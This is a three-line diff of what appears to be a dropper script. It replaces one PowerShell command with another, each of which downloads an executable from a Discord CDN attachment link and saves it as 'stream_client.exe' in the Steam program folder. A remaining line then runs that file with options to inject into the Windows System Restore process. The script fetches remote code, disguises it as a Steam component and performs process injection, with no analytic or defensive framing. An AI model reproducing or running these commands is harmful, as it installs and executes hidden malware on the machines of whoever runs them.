@@ -1,3 +1,3 @@
-powershell -Command "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1195789181784436838/1195789609548906546/a.exe' -OutFile 'C:\Program Files (x86)\Steam\stream_client.exe'"
+powershell -Command "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1195789181784436838/1195791255750316152/a.exe' -OutFile 'C:\Program Files (x86)\Steam\stream_client.exe'"
 
 & "C:\Program Files (x86)\Steam\stream_client.exe" --process-name rstrui.exe --inject WriteMiniDmp.exe
